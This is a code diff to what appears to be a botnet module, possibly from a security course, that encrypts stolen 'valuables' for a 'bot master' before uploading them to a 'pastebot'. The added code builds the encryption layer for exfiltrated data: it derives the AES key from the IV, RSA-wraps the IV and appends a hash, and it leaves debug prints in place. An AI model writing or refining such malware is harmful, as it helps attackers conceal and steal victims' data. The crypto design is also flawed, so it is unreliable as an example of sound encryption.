@@ -6,6 +6,8 @@ from Crypto.Hash import SHA256
 from Crypto import Random
 from Crypto.Cipher import AES
 
+from lib.crypto_utils import ANSI_X923_pad
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -20,7 +22,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    hashed_data = SHA256.new(data);
+    hashed_data = SHA256.new(data).digest();
 
     pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
 
@@ -29,7 +31,24 @@ def encrypt_for_master(data):
     # encrypt AES key with RSA
     # RSA(iv) + AES(file) + digest
 
-    return pkcs_cipher.encrypt(data) + hashed_data.digest();
+    iv = Random.get_random_bytes(AES.block_size)
+    print(len(str(iv)))
+    aes_encrypted_data = AES.new(str(iv)[:16], AES.MODE_CBC, iv).encrypt(ANSI_X923_pad(data, AES.block_size))
+    print("AES")
+    print(aes_encrypted_data)
+    print(len(aes_encrypted_data))
+
+    rsa_encrypted_iv = masters_public_key.encrypt(iv, "")[0]
+
+    print("RSA")
+    print(rsa_encrypted_iv)
+    print(type(rsa_encrypted_iv))
+
+    #array = [rsa_encrypted_iv, aes_encrypted_data, hashed_data]
+    array = (aes_encrypted_data + hashed_data)
+
+    return rsa_encrypted_iv + array;
+    # return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
